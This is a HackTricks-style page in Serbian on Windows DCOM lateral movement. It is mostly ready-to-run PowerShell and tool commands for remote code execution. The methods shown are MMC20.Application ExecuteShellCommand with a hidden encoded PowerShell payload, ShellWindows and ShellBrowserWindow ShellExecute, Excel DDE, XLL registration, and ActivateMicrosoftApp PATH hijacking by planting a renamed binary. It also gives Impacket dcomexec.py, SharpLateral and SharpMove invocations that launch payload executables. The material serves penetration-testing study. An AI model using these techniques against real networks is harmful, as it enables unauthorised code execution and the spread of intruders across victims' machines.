# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement je privlačan jer ponovo koristi postojeće COM servere izložene preko RPC/DCOM umesto da kreira service ili scheduled task. U praksi to znači da početna konekcija obično kreće na TCP/135, a zatim prelazi na dinamički dodeljene visoke RPC portove.

## Prerequisites & Gotchas

- Obično vam treba lokalni administrator context na targetu i remote COM server mora da dozvoli remote launch/activation.
- Od **14. marta 2023**, Microsoft primenjuje DCOM hardening za podržane sisteme. Stari clients koji traže nizak activation authentication level mogu da fail-uju osim ako ne pregovaraju bar `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients se obično automatski podižu, pa current tooling normalno i dalje radi.
- Manual ili scripted DCOM execution uglavnom zahteva TCP/135 plus target-ov dynamic RPC port range. Ako koristite Impacket-ov `dcomexec.py` i želite nazad command output, obično vam takođe treba SMB access do `ADMIN$` (ili nekog drugog writable/readable share-a).
- Ako RPC/DCOM radi, ali SMB je blokiran, `dcomexec.py -nooutput` i dalje može biti koristan za blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Za više informacija o ovoj tehnici pogledajte originalni post sa [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objekti nude zanimljivu mogućnost za mrežne interakcije sa objektima. Microsoft pruža opsežnu dokumentaciju i za DCOM i za Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Lista DCOM aplikacija može se preuzeti pomoću PowerShell komande:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC snap-in-a. Posebno, ovaj object sadrži `ExecuteShellCommand` metodu pod `Document.ActiveView`. Više informacija o ovoj metodi može se naći [ovde](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Proverite kako radi:

Ova funkcija omogućava izvršavanje komandi preko network-a kroz DCOM application. Za interakciju sa DCOM remotely kao admin, PowerShell može da se koristi ovako:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ova komanda se povezuje na DCOM aplikaciju i vraća instancu COM objekta. Metod ExecuteShellCommand se zatim može pozvati da bi se izvršio proces na udaljenom hostu. Proces uključuje sledeće korake:

Proverite metode:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Get RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Последњи аргумент је стил прозора. `7` држи прозор минимизованим. У оперативном смислу, извршавање засновано на MMC-у обично доводи до тога да удаљени процес `mmc.exe` покрене ваш payload, што је различито од објеката заснованих на Explorer-у испод.

## ShellWindows & ShellBrowserWindow

**За више информација о овој техници погледајте оригинални пост [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Објекат **MMC20.Application** је идентификован као онај који нема експлицитне "LaunchPermissions," па подразумевано користи дозволе које омогућавају Administrators приступ. За додатне детаље, тема се може погледати [овде](https://twitter.com/tiraniddo/status/817532039771525120), а препоручује се употреба [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET за филтрирање објеката без експлицитне Launch Permission.

Два специфична објекта, `ShellBrowserWindow` и `ShellWindows`, истакнута су због недостатка експлицитних Launch Permissions. Одсуство `LaunchPermission` registry уноса под `HKCR:\AppID\{guid}` означава да не постоје експлицитне дозволе.

У поређењу са `MMC20.Application`, ови објекти су често тиши са OPSEC становишта, јер команда обично заврши као child `explorer.exe` процеса на удаљеном хосту уместо `mmc.exe`.

### ShellWindows

За `ShellWindows`, који нема ProgID, .NET методе `Type.GetTypeFromCLSID` и `Activator.CreateInstance` омогућавају инстанцирање објекта користећи његов AppID. Овај процес користи OleView .NET да преузме CLSID за `ShellWindows`. Након инстанцирања, интеракција је могућа преко `WindowsShell.Item` методе, што доводи до позива метода као што је `Document.Application.ShellExecute`.

Дати су PowerShell примери за инстанцирање објекта и удаљено извршавање команди:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` je sličan, ali ga možete instancirati direktno preko njegovog CLSID-a i pivotirati na `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement with Excel DCOM Objects

Lateral movement može se ostvariti iskorišćavanjem DCOM Excel objekata. Za detaljnije informacije, preporučljivo je pročitati diskusiju o korišćenju Excel DDE za lateral movement preko DCOM-a na [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Empire projekat obezbeđuje PowerShell skriptu, koja demonstrira korišćenje Excel-a za remote code execution (RCE) manipulisanjem DCOM objekata. Ispod su isečci iz skripte dostupne na [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode za abuse Excel-a za RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Skorija istraživanja proširila su ovu oblast metodom `Excel.Application`-a `ActivateMicrosoftApp()` `.` Ključna ideja je da Excel može da pokuša da pokrene legacy Microsoft aplikacije kao što su FoxPro, Schedule Plus ili Project, pretraživanjem sistemskog `PATH`-a. Ako operater može da postavi payload sa jednim od tih očekivanih imena na lokaciju sa dozvolom za upis koja je deo target-ovog `PATH`-a, Excel će ga izvršiti.

Zahtevi za ovu varijantu:

- Local admin na target-u
- Excel instaliran na target-u
- Mogućnost upisa payload-a u writable direktorijum u target-ovom `PATH`-u

Praktičan primer zloupotrebe FoxPro lookup-a (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Ako napadački host nema lokalno registrovan `Excel.Application` ProgID, instanciraj udaljeni objekat po CLSID-u umesto toga:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Vrednosti koje se u praksi vide kao zloupotrebljene:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Alati za automatizaciju lateralnog kretanja

Istaknuta su dva alata za automatizaciju ovih tehnika:

- **Invoke-DCOM.ps1**: PowerShell skripta koju pruža Empire projekat i koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim mašinama. Ova skripta je dostupna u Empire GitHub repozitorijumu.

- **SharpLateral**: Alat dizajniran za udaljeno izvršavanje koda, koji se može koristiti sa komandom:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatski alati

- Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) omogućava da se lako pozovu svi komentarisani načini za izvršavanje koda na drugim mašinama.
- Možete koristiti Impacket-ov `dcomexec.py` za izvršavanje komandi na udaljenim sistemima koristeći DCOM. Trenutne verzije podržavaju `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a podrazumevano koriste `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Takođe možete da koristite [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Takođe možete koristiti [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Reference

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
